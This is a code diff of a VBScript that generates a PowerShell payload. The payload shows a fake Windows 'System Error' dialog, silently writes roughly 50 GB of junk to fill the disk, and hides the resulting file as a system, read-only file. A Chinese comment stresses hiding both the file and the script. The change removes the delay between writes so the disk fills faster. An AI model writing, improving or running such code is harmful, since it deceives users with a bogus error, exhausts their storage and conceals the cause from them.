@@ -33,7 +33,7 @@ psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
 psFile.WriteLine "[System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible.', 'System Error', 0, 16)"
 psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
 psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
-psFile.WriteLine "for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 1 }"
+psFile.WriteLine "for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 0 }"
 psFile.WriteLine "$Stream.Close()"
 ' 这里的命令是关键：同时隐藏数据文件和脚本自己
 psFile.WriteLine "attrib +h +s +r `"$BigFile`""
@@ -48,5 +48,6 @@ attrib +h +s +r "$BigFile"
 
 Set fso = Nothing
 Set WshShell = Nothing
+
 
 
